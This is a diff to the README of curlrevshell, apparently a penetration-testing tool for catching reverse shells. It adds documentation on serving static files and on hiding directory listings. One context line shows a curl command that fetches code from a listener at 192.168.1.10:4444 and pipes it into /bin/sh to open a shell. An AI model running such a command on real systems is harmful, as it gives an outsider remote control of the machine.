@@ -282,6 +282,13 @@ target1>
 Serves up static files from a directory.  If a file is given instead of a
 directory, that file is served up for any path not used by shell things.
 
+By default, when a directory is requested (e.g. `/`), its contents are listed.
+As a special case, curlrevshell (and totally not the
+[underlying library](https://pkg.go.dev/net/http#FileServer)  redirects any
+request ending in "/index.html" to the same path, without the final
+"index.html".  This is not only a nifty way to serve up some quick HTML, but
+make scraper-prevention a simple `touch index.html`.
+
 Handy for staging other tools or if you really just needed a way to HTTP a file
 from point A to point B with a minimum of fuss.
 
@@ -297,6 +304,13 @@ curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' '
 17:32:42.881 To get a shell:
 
 curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10:4444/c' | /bin/sh
+```
+
+Serve files from `./d`, but prevent listing the contents of `./d/sneaky`:
+```
+$ mkdir -p ./d/sneaky
+$ touch ./d/sneaky/index.html
+$ ./curlrevshell -serve-files-from ./d
 ```
 
 `-tls-certificate-cache`
